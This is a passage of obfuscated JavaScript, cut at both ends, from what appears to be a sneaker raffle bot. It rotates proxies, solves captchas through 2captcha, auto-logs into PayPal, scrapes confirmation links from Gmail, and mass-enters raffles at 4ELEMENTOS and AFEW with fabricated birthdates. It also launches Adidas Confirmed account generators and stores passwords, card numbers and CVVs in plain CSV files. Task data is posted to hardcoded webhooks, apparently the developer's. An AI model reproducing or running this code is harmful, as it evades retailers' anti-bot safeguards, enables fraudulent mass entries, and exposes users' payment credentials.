        var _0x127fe9 = '', _0x13eaff = 0x0;
    async function _0xdf7cd7() {
        var _0x59dba8 = _0x3f4ea0['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x53492f = _0x55493a['parse'](_0x59dba8, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x28c3ac = 0x0; _0x28c3ac < _0x53492f['length']; _0x28c3ac++) {
            console['log']('(' + _0x28c3ac + ')\x20' + _0x53492f[_0x28c3ac]['Email']);
        }
        console['log']('\x0a(' + _0x53492f['length'] + ')\x20' + _0xe2a5bb['cyan']('Add\x20a\x20new\x20account'));
        let _0x4b7978 = await _0x255b95['get']('Option');
        if (_0x4b7978['Option'] < _0x53492f['length'])
            return _0x53492f[_0x4b7978['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x19b9fd = {}, _0xfc35c3 = await _0x255b95['get']('Email');
        _0x19b9fd['Email'] = _0xfc35c3['Email'];
        var _0x332af7 = Math['round'](Math['random']() * (_0x2ce6a2['length'] - 0x1));
        _0x19b9fd['Proxy'] = _0x2ce6a2[_0x332af7], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0xc63037 = await _0x255b95['get']('Password');
        return _0x19b9fd['Password'] = _0xc63037['Password'], _0x3f4ea0['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x19b9fd['Email'] + ',' + _0x19b9fd['Password'] + ',' + _0x19b9fd['Proxy']), _0x19b9fd;
    }
    let _0x30fe58 = await _0xdf7cd7();
    var _0x44281e = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x3a198b = await _0x255b95['get']('Amount'), _0x1d034c = _0x3a198b['Amount'];
    async function _0x10820e() {
        let _0x8f9f31 = 0x0;
        var _0xab25cc = new _0xda3ce2({
            'user': _0x11db88['masterMail'],
            'password': _0x11db88['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x437c52(_0x2420df) {
            _0xab25cc['openBox']('INBOX', ![], _0x2420df);
        }
        _0xab25cc['once']('ready', function () {
            _0x437c52(function (_0x4652f0, _0x498116) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x4652f0)
                    throw _0x4652f0;
                _0xab25cc['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x5d0c5e, _0x3f74af) {
                    if (!_0x3f74af || !_0x3f74af['length'])
                        console['log'](_0xb9a031() + '\x20[' + _0x3d2dd8 + ']\x20No\x20mails\x20found'), _0xab25cc['end']();
                    else {
                        _0x3f74af = _0x3f74af['slice'](0x0, _0x1d034c);
                        var _0x39457f = _0xab25cc['seq']['fetch'](_0x3f74af, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x39457f['on']('message', function (_0x455117, _0x4771d3) {
                            var _0x4705b7 = '(#' + _0x4771d3 + ')\x20';
                            _0x455117['on']('body', function (_0x3363a4, _0x5c712f) {
                                _0x482936(_0x3363a4, (_0x5141be, _0x17437f) => {
                                    if (_0x17437f['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x17437f['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x17437f['text']['split']('[')[0x2];
                                        var _0x154f22 = mes['split'](']')[0x0];
                                        _0x44281e['push'](_0x154f22);
                                    }
                                });
                            }), _0x455117['once']('end', function () {
                                _0x8f9f31++;
                            });
                        }), _0x39457f['once']('error', function (_0x31ca02) {
                            console['log']('Fetch\x20error:\x20' + _0x31ca02);
                        }), _0x39457f['once']('end', function () {
                            _0xab25cc['end']();
                        });
                    }
                });
            });
        }), _0xab25cc['once']('error', function (_0x1794b2) {
            console['log'](_0xe2a5bb['red'](_0x1794b2['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0xab25cc['once']('end', async function () {
        }), _0xab25cc['connect']();
    }
    try {
        _0x10820e(), await _0x558aee(0xfa0), console['log']('Found\x20' + _0x44281e['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x558aee(0xfa0);
    }
    var _0x2df483;
    _0x9f07d8('' + _0x3d2dd8);
    var _0x57122a = _0x30fe58['Proxy']['split'](':'), _0x1e19fb;
    try {
        _0x1e19fb = await _0x40dba9['launch']({
            'userDataDir': 'sessions/' + _0x30fe58['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x57122a[0x0] + ':' + _0x57122a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x1e19fb = await _0x40dba9['launch']({
            'userDataDir': 'sessions/' + _0x30fe58['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x57122a[0x0] + ':' + _0x57122a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0xb9a031() + '\x20[' + _0x3d2dd8 + ']\x20Getting\x20Session');
        const _0x59080e = await _0x1e19fb['newPage']();
        await _0x59080e['authenticate']({
            'username': '' + _0x57122a[0x2],
            'password': '' + _0x57122a[0x3]
        }), await _0x59080e['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x59080e['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0xb9a031() + '\x20[' + _0x3d2dd8 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x59080e['waitForSelector']('#email');
            let _0x999e1e = await _0x59080e['$eval']('#email', _0x4836d6 => _0x4836d6['getAttribute']('value'));
            if (_0x999e1e == '') {
                await _0x59080e['type']('#email', _0x30fe58['Email']), await _0x558aee(0x1d3);
                let _0x428233 = await _0x59080e['$']('#splitPassword');
                _0x428233 && (await _0x59080e['click']('#btnNext'), await _0x558aee(0xa28)), await _0x59080e['type']('#password', _0x30fe58['Password']), await _0x558aee(0x35c), await _0x59080e['click']('#btnLogin');
            } else
                await _0x59080e['type']('#password', _0x30fe58['Password']), await _0x558aee(0x35c), await _0x59080e['click']('#btnLogin');
            await _0x59080e['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0xb9a031() + '\x20[' + _0x3d2dd8 + ']\x20Successfully\x20logged\x20in'), await _0x558aee(0x2710);
        } catch (_0x5bceb5) {
            throw new Error('Login\x20session\x20expired\x20' + _0x5bceb5);
        }
        for (var _0x30dbdd = 0x0; _0x30dbdd < _0x44281e['length']; _0x30dbdd++) {
            console['log'](_0xb9a031() + '\x20[' + _0x3d2dd8 + ']\x20Task\x20' + (_0x30dbdd + 0x1) + '\x20:\x20Starting\x20Verification'), _0x9f07d8(_0x3d2dd8 + '\x20Task\x20' + (_0x30dbdd + 0x1) + '\x20/\x20' + _0x44281e['length']);
            const _0x5a84dc = await _0x1e19fb['newPage']();
            await _0x5a84dc['goto']('' + _0x44281e[_0x30dbdd], { 'waitUntil': 'networkidle2' }), await _0x558aee(0xbb8);
            try {
                const _0x41d97f = await _0x5a84dc['$']('#challenge-heading');
                _0x41d97f && (console['log'](_0xb9a031() + '\x20[' + _0x3d2dd8 + ']\x20Task\x20' + (_0x30dbdd + 0x1) + '\x20:\x20' + _0xe2a5bb['yellow']('2FA\x20Required')), await _0x5a84dc['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x558aee(0x9c40), await _0x5a84dc['waitForSelector']('#payment-submit-btn'), await _0x5a84dc['$eval']('#payment-submit-btn', _0x27ba8c => _0x27ba8c['click']()), await _0x5a84dc['click']('#payment-submit-btn');
                try {
                    await _0x5a84dc['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x558aee(0x5dc), console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x3d2dd8 + ']\x20Task\x20' + (_0x30dbdd + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x46f3ec) {
                    _0x127fe9 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x46f3ec['message']);
                } finally {
                    if (_0x127fe9 == 'yes' && _0x13eaff != 0x2) {
                        console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x3d2dd8['name'] + ']\x20Task\x20' + (_0x30dbdd + 0x1) + '\x20:\x20Retrying\x20(' + _0x13eaff + '\x20/\x205)')), _0x30dbdd = _0x30dbdd - 0x1, _0x13eaff = _0x13eaff + 0x1;
                        continue;
                    }
                    _0x127fe9 == 'yes' && _0x13eaff >= 0x2 && (_0x15a8e9(csv[_0x30dbdd], _0x3d2dd8), _0x127fe9 = 'no', _0x13eaff = 0x0), await _0x5a84dc['close'](), await _0x558aee(0x4650);
                }
            } catch (_0x16db7a) {
                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x3d2dd8 + ']\x20Task\x20' + (_0x30dbdd + 0x1) + '\x20:\x20' + _0x16db7a));
            }
        }
    } catch (_0xf58eda) {
        console['log'](_0xe2a5bb['red']('' + _0xf58eda));
    } finally {
        await _0x1e19fb['close']();
    }
}
const _0x1735b8 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0x5f3fb3, _0x24e5a4, _0x1cb02c) {
                _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x11db88['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2c5f65 = 0x0; _0x2c5f65 < _0x24e5a4['length']; _0x2c5f65++) {
                    if (_0x12440a != 'yes')
                        var _0x12440a = '', _0x4a2569 = 0x0;
                    var _0x1122a5;
                    try {
                        await _0x162b07(_0x24e5a4, _0x2c5f65);
                    } catch {
                        _0x12440a = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x9f07d8(_0x5f3fb3['name'] + '\x20Task\x20' + (_0x2c5f65 + 0x1) + '\x20/\x20' + _0x24e5a4['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                    var _0xfc573d = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x2ca3d4 = Math['round'](Math['random']() * (_0xfc573d['length'] - 0x1));
                    _0x24e5a4[_0x2c5f65]['Size'] == 'RANDOM' && (_0x24e5a4[_0x2c5f65]['Size'] = _0xfc573d[_0x2ca3d4]);
                    var _0x4cca89 = Math['round'](Math['random']() * (_0x1cb02c['length'] - 0x1)), _0x18638a = _0x1cb02c[_0x4cca89]['split'](':'), _0x3a50a3;
                    try {
                        _0x3a50a3 = await _0x40dba9['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x18638a[0x0] + ':' + _0x18638a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3a50a3 = await _0x40dba9['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x18638a[0x0] + ':' + _0x18638a[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0xb9a031() + '\x20[' + _0x5f3fb3['name'] + ']\x20Task\x20' + (_0x2c5f65 + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x3b75cc = await _0x3a50a3['newPage']();
                        await _0x3b75cc['authenticate']({
                            'username': '' + _0x18638a[0x2],
                            'password': '' + _0x18638a[0x3]
                        }), await _0x3b75cc['setRequestInterception'](!![]), _0x3b75cc['on']('request', _0x4be020 => {
                            _0x4be020['resourceType']() === 'image' || _0x4be020['resourceType']() === 'font' || _0x4be020['resourceType']() === 'media' ? _0x4be020['abort']() : _0x4be020['continue']();
                        }), await _0x3b75cc['goto'](_0x24e5a4[_0x2c5f65]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0xb9a031() + '\x20[' + _0x5f3fb3['name'] + ']\x20Task\x20' + (_0x2c5f65 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x558aee(0x3e8), await _0x3b75cc['waitForSelector']('#accept-all-gdpr'), await _0x3b75cc['click']('#accept-all-gdpr'), await _0x3b75cc['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x558aee(0xbb8);
                        let _0x5bce45 = await _0x3b75cc['$$']('button');
                        for (button of _0x5bce45) {
                            let _0x19cd5c = await _0x3b75cc['evaluate'](_0x4ee906 => _0x4ee906['innerHTML'], button);
                            if (_0x19cd5c['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x558aee(0x1388), await _0x3b75cc['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0xb9a031() + '\x20[' + _0x5f3fb3['name'] + ']\x20Task\x20' + (_0x2c5f65 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x558aee(0x3e8);
                        let _0x4b47ef = await _0x3b75cc['$$']('input[name=\x22email\x22]');
                        await _0x4b47ef[0x1]['click'](), await _0x558aee(0x12c), await _0x3b75cc['keyboard']['type'](_0x24e5a4[_0x2c5f65]['Email']), await _0x558aee(0x1c2), await _0x3b75cc['type']('input[name=\x22Nombre\x22]', _0x24e5a4[_0x2c5f65]['FirstName'] + '\x20' + _0x24e5a4[_0x2c5f65]['LastName']), await _0x558aee(0x1c2), await _0x3b75cc['type']('input[name=\x22Direccion\x22]', _0x24e5a4[_0x2c5f65]['Address1'] + '\x20' + _0x24e5a4[_0x2c5f65]['HouseNumber'] + '\x20' + _0x24e5a4[_0x2c5f65]['Address2']), await _0x558aee(0x1c2), await _0x3b75cc['type']('input[name=\x22Ciudad\x22]', _0x24e5a4[_0x2c5f65]['City']), await _0x558aee(0x1c2), await _0x3b75cc['type']('input[name=\x22Provincia\x22]', _0x24e5a4[_0x2c5f65]['State']), await _0x558aee(0x1c2), await _0x3b75cc['type']('input[name=\x22CP\x22]', _0x24e5a4[_0x2c5f65]['Zip']), await _0x558aee(0x1c2), await _0x3b75cc['select']('select[name=\x22Pais\x22]', _0x24e5a4[_0x2c5f65]['Country']), await _0x558aee(0x1c2), await _0x3b75cc['type']('input[name=\x22Telefono\x22]', _0x24e5a4[_0x2c5f65]['Phone']), await _0x558aee(0x1c2), await _0x3b75cc['type']('input[name=\x22cumple\x22]', _0x3e9320(0x1, 0x14) + '-' + _0x3e9320(0x1, 0xb) + '-' + _0x3e9320(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x558aee(0x1c2), await _0x3b75cc['type']('input[name=\x22Instagram\x22]', _0x24e5a4[_0x2c5f65]['Follower']), await _0x558aee(0x1c2), await _0x3b75cc['type']('input[name=\x22Talla\x22]', _0x24e5a4[_0x2c5f65]['Size']), await _0x558aee(0x1f4), await _0x3b75cc['click']('#sexo_hombre'), await _0x558aee(0x1f4), await _0x3b75cc['click']('#idioma_ingles'), await _0x558aee(0x1f4), await _0x3b75cc['click']('#privacidad_si'), await _0x558aee(0x1f4), await _0x3b75cc['click']('#acepta_suscripcion_si'), await _0x558aee(0x1f4), console['log'](_0xb9a031() + '\x20[' + _0x5f3fb3['name'] + ']\x20Task\x20' + (_0x2c5f65 + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x1fba0f = await _0x3b75cc['$$']('button');
                        for (button of _0x1fba0f) {
                            let _0x5e06ab = await _0x3b75cc['evaluate'](_0x3cf8cd => _0x3cf8cd['innerHTML'], button);
                            if (_0x5e06ab['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x558aee(0x1388), console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x5f3fb3['name'] + ']\x20Task\x20' + (_0x2c5f65 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x12440a = '';
                        var _0xff9eed = await _0x459281(_0x24e5a4[_0x2c5f65], _0x5f3fb3, 'dev', ![]), _0x45de95 = await _0x459281(_0x24e5a4[_0x2c5f65], _0x5f3fb3, 'pub', ![]);
                        const _0x157027 = {
                            'succesDEVMSG': { 'embeds': [_0xff9eed] },
                            'succesPUBMSG': { 'embeds': [_0x45de95] }
                        };
                        try {
                            _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x157027['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x157027['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x122725, _0x157027['succesPUBMSG']);
                        } catch (_0x144e27) {
                            console['log'](_0xe2a5bb['yellow'](_0xb9a031() + '\x20[' + _0x5f3fb3['name'] + ']\x20Task\x20' + (_0x2c5f65 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x144e27));
                        }
                    } catch (_0x195718) {
                        console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x5f3fb3['name'] + ']\x20Task\x20' + (_0x2c5f65 + 0x1) + '\x20:\x20' + _0x195718)), _0x1122a5 = '' + _0x195718;
                        var _0x2c9c03 = await _0x459281(_0x24e5a4[_0x2c5f65], _0x5f3fb3, 'dev', !![], _0x1122a5), _0xff9eed = await _0x459281(_0x24e5a4[_0x2c5f65], _0x5f3fb3, 'dev', ![]), _0x45de95 = await _0x459281(_0x24e5a4[_0x2c5f65], _0x5f3fb3, 'pub', ![]);
                        const _0x597ac1 = {
                            'succesDEVMSG': { 'embeds': [_0xff9eed] },
                            'succesPUBMSG': { 'embeds': [_0x45de95] }
                        };
                        _0x597ac1['errorDEV'] = { 'embeds': [_0x2c9c03] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x597ac1['errorDEV']), await _0x5a13a5(_0x877ec9, _0x597ac1['errorDEV']), _0x195718 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x12440a = 'yes');
                    } finally {
                        _0x3a50a3['close']();
                        if (_0x12440a == 'yes' && _0x4a2569 != 0x5 && _0x1122a5 != 'Size\x20Not\x20Found') {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x5f3fb3['name'] + ']\x20Task\x20' + (_0x2c5f65 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4a2569 + '\x20/\x205)\x20')), _0x2c5f65 = _0x2c5f65 - 0x1, _0x4a2569 = _0x4a2569 + 0x1;
                            continue;
                        }
                        _0x12440a == 'yes' && _0x4a2569 >= 0x5 && (_0x15a8e9(_0x24e5a4[_0x2c5f65], _0x5f3fb3), _0x12440a = 'no', _0x4a2569 = 0x0), console['log'](_0xb9a031() + '\x20[' + _0x5f3fb3['name'] + ']\x20Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'ADIDAS\x20CONFIRMED',
        'modules': [
            {
                'name': 'CONFIRMED\x20Account\x20Generator',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x47021a, _0x385490) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..');
                    for (var _0x24c073 = 0x0; _0x24c073 < _0x47021a['length']; _0x24c073++) {
                        await _0x162b07(_0x47021a, _0x24c073), _0x3f4ea0['appendFileSync']('tasks.csv', '\x0a' + _0x47021a[_0x24c073]['Url'] + ',' + _0x47021a[_0x24c073]['Size'] + ',' + _0x47021a[_0x24c073]['Email'] + ',' + _0x47021a[_0x24c073]['Password'] + ',' + _0x47021a[_0x24c073]['FirstName'] + ',' + _0x47021a[_0x24c073]['LastName'] + ',' + _0x47021a[_0x24c073]['Address1'] + ',' + _0x47021a[_0x24c073]['Address2'] + ',' + _0x47021a[_0x24c073]['HouseNumber'] + ',' + _0x47021a[_0x24c073]['Zip'] + ',' + _0x47021a[_0x24c073]['City'] + ',' + _0x47021a[_0x24c073]['Country'] + ',' + _0x47021a[_0x24c073]['State'] + ',' + _0x47021a[_0x24c073]['CardNumber'] + ',' + _0x47021a[_0x24c073]['ExpiryDate'] + ',' + _0x47021a[_0x24c073]['CVV'] + ',' + _0x47021a[_0x24c073]['NameOnCard'] + ',' + _0x47021a[_0x24c073]['Phone'] + ',' + _0x47021a[_0x24c073]['Follower']);
                    }
                    await _0x558aee(0x3e8), _0x4a8825('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/tempgen.py'
                    ], { 'shell': !![] });
                }
            },
            {
                'name': 'CONFIRMED\x20Info\x20Adder',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x39aa9b, _0xed67a7) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..');
                    for (var _0x65f30e = 0x0; _0x65f30e < _0x39aa9b['length']; _0x65f30e++) {
                        await _0x162b07(_0x39aa9b, _0x65f30e), _0x3f4ea0['appendFileSync']('tasks.csv', '\x0a' + _0x39aa9b[_0x65f30e]['Url'] + ',' + _0x39aa9b[_0x65f30e]['Size'] + ',' + _0x39aa9b[_0x65f30e]['Email'] + ',' + _0x39aa9b[_0x65f30e]['Password'] + ',' + _0x39aa9b[_0x65f30e]['FirstName'] + ',' + _0x39aa9b[_0x65f30e]['LastName'] + ',' + _0x39aa9b[_0x65f30e]['Address1'] + ',' + _0x39aa9b[_0x65f30e]['Address2'] + ',' + _0x39aa9b[_0x65f30e]['HouseNumber'] + ',' + _0x39aa9b[_0x65f30e]['Zip'] + ',' + _0x39aa9b[_0x65f30e]['City'] + ',' + _0x39aa9b[_0x65f30e]['Country'] + ',' + _0x39aa9b[_0x65f30e]['State'] + ',' + _0x39aa9b[_0x65f30e]['CardNumber'] + ',' + _0x39aa9b[_0x65f30e]['ExpiryDate'] + ',' + _0x39aa9b[_0x65f30e]['CVV'] + ',' + _0x39aa9b[_0x65f30e]['NameOnCard'] + ',' + _0x39aa9b[_0x65f30e]['Phone'] + ',' + _0x39aa9b[_0x65f30e]['Follower']);
                    }
                    await _0x558aee(0x3e8), _0x4a8825('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/tempadd.py'
                    ], { 'shell': !![] });
                }
            },
            {
                'name': 'CONFIRMED\x20Entries',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x35dd3e, _0x2032ab) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..'), _0x3f4ea0['writeFileSync']('proxies.txt', '');
                    for (proxy in _0x2032ab) {
                        _0x3f4ea0['appendFileSync']('proxies.txt', _0x2032ab[proxy] + '\x0a');
                    }
                    for (var _0x510db8 = 0x0; _0x510db8 < _0x35dd3e['length']; _0x510db8++) {
                        await _0x162b07(_0x35dd3e, _0x510db8), _0x3f4ea0['appendFileSync']('tasks.csv', '\x0a' + _0x35dd3e[_0x510db8]['Url'] + ',' + _0x35dd3e[_0x510db8]['Size'] + ',' + _0x35dd3e[_0x510db8]['Email'] + ',' + _0x35dd3e[_0x510db8]['Password'] + ',' + _0x35dd3e[_0x510db8]['FirstName'] + ',' + _0x35dd3e[_0x510db8]['LastName'] + ',' + _0x35dd3e[_0x510db8]['Address1'] + ',' + _0x35dd3e[_0x510db8]['Address2'] + ',' + _0x35dd3e[_0x510db8]['HouseNumber'] + ',' + _0x35dd3e[_0x510db8]['Zip'] + ',' + _0x35dd3e[_0x510db8]['City'] + ',' + _0x35dd3e[_0x510db8]['Country'] + ',' + _0x35dd3e[_0x510db8]['State'] + ',' + _0x35dd3e[_0x510db8]['CardNumber'] + ',' + _0x35dd3e[_0x510db8]['ExpiryDate'] + ',' + _0x35dd3e[_0x510db8]['CVV'] + ',' + _0x35dd3e[_0x510db8]['NameOnCard'] + ',' + _0x35dd3e[_0x510db8]['Phone'] + ',' + _0x35dd3e[_0x510db8]['Follower']);
                    }
                    await _0x558aee(0x3e8), _0x4a8825('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/sensor.py'
                    ], { 'shell': !![] });
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x247cf4, _0x13e09c, _0x24b8ce) {
                for (var _0x5c618b = 0x0; _0x5c618b < _0x13e09c['length']; _0x5c618b++) {
                    _0x11db88['AfewDelay'] = _0x11db88['delay'];
                    var _0x445d77;
                    if (_0x25effb != 'yes')
                        var _0x25effb = '', _0x7e6f74 = 0x0;
                    var _0xf7feae = _0x13e09c[_0x5c618b]['Url'], _0x110990 = _0x13e09c[_0x5c618b];
                    _0x9f07d8(_0x247cf4['name'] + '\x20Task\x20' + (_0x5c618b + 0x1) + '\x20/\x20' + _0x13e09c['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                    try {
                        await _0x162b07(_0x13e09c, _0x5c618b);
                    } catch {
                        _0x25effb = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x59c172(_0x6d974b) {
                        const _0x1981db = _0x3f4ea0['readFileSync']('../successful-tasks.csv', 'utf8'), _0x2e1cd3 = _0x55493a['parse'](_0x1981db, { 'header': !![] })['data'];
                        let _0x51f564 = ![];
                        for (var _0x8f2d85 of _0x2e1cd3) {
                            if (_0x8f2d85['Url'] == _0x6d974b['Url'] && _0x8f2d85['Email'] == _0x6d974b['Email']) {
                                _0x51f564 = !![];
                                break;
                            }
                        }
                        return _0x51f564;
                    }
                    if (await _0x59c172(_0x13e09c[_0x5c618b]) == !![]) {
                        console['log'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x4942a7 = await _0x459281(_0x13e09c[_0x5c618b], _0x247cf4, 'dev', ![]), _0x5bb5a4 = await _0x459281(_0x13e09c[_0x5c618b], _0x247cf4, 'pub', ![]);
                    const _0x39123a = {
                        'succesDEVMSG': { 'embeds': [_0x4942a7] },
                        'succesPUBMSG': { 'embeds': [_0x5bb5a4] }
                    };
                    if (_0x13e09c[_0x5c618b]['Email'] == '' || _0x13e09c[_0x5c618b]['FirstName'] == '' || _0x13e09c[_0x5c618b]['LastName'] == '' || _0x13e09c[_0x5c618b]['Country'] == '' || _0x13e09c[_0x5c618b]['Size'] == '' || _0x13e09c[_0x5c618b]['Address1'] == '' || _0x13e09c[_0x5c618b]['Zip'] == '') {
                        console['log'](_0xb9a031() + '\x20[' + _0x247cf4['name'] + ']\x20Task\x20' + (_0x5c618b + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0x13e09c[_0x5c618b]['Country']['length'] == 0x2 && (_0x13e09c[_0x5c618b]['Country'] = _0x88ec60[_0x13e09c[_0x5c618b]['Country']]);
                    if (_0x11db88['useRandomProxy'] = ![])
                        var _0x42416b = _0x24b8ce[_0x5c618b]['split'](':');
                    else
                        var _0x108d81 = Math['round'](Math['random']() * (_0x24b8ce['length'] - 0x1)), _0x42416b = _0x24b8ce[_0x108d81]['split'](':');
                    var _0x4b6ea3;
                    try {
                        _0x4b6ea3 = await _0x40dba9['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x42416b[0x0] + ':' + _0x42416b[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4b6ea3 = await _0x40dba9['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x42416b[0x0] + ':' + _0x42416b[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
